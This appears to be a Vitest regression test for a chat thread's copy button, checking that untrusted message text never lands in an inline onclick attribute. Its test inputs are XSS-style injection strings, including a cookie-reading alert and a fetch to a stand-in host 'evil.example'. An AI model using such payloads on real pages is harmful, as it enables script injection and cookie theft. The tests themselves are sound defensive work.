// @vitest-environment jsdom
// @summary
// Regression tests for the message-thread copy-button wiring: untrusted
// message text (clarify-chip resubmits carry LLM/document-derived strings)
// must NEVER be interpolated into an inline event-handler attribute — HTML
// attribute values are entity-decoded before the JS engine parses them, so
// escHtml cannot neutralize quotes there (JS-injection class). The handler
// must close over the raw text via addEventListener instead.
// @end-summary
import { beforeEach, describe, expect, it, vi } from "vitest";

import { appendUserMsg } from "../thread";
import { refs } from "../refs";

function installThread(): HTMLElement {
    document.body.innerHTML = '<div id="thread"></div><div id="toast"></div>';
    const thread = document.getElementById("thread") as HTMLElement;
    (refs as unknown as Record<string, unknown>).thread = thread;
    return thread;
}

describe("appendUserMsg (untrusted-text copy wiring)", () => {
    beforeEach(() => {
        installThread();
        Object.assign(navigator, {
            clipboard: { writeText: vi.fn().mockResolvedValue(undefined) },
        });
    });

    it("never interpolates message text into an inline event-handler attribute", () => {
        // Two DIFFERENT instances of the injection class (CLAUDE.md §0): an
        // expression smuggled through JS string concatenation, and a
        // statement-terminator payload. Neither contains a char escHtml maps,
        // except the quote — which attribute decoding would hand back.
        for (const hostile of [
            "'+alert(document.cookie)+'",
            "');fetch('//evil.example')//",
        ]) {
            const group = appendUserMsg(hostile);
            const btn = group.querySelector<HTMLElement>(".msg-action-btn");
            expect(btn).not.toBeNull();
            // The class-level invariant: no inline handler attribute at all —
            // not merely "the payload looks escaped".
            for (const attr of Array.from(btn!.attributes)) {
                expect(attr.name.startsWith("on")).toBe(false);
            }
            expect(group.innerHTML).not.toContain("onclick");
        }
    });

    it("copies the exact raw text via the closure handler", () => {
        const hostile = "'+alert(1)+' <b>not markup</b>";
        const group = appendUserMsg(hostile);
        // Rendered inert (escaped), not parsed as markup.
        expect(group.querySelector(".bubble b")).toBeNull();
        const btn = group.querySelector<HTMLElement>(".msg-action-btn")!;
        btn.click();
        expect(navigator.clipboard.writeText).toHaveBeenCalledWith(hostile);
    });
});
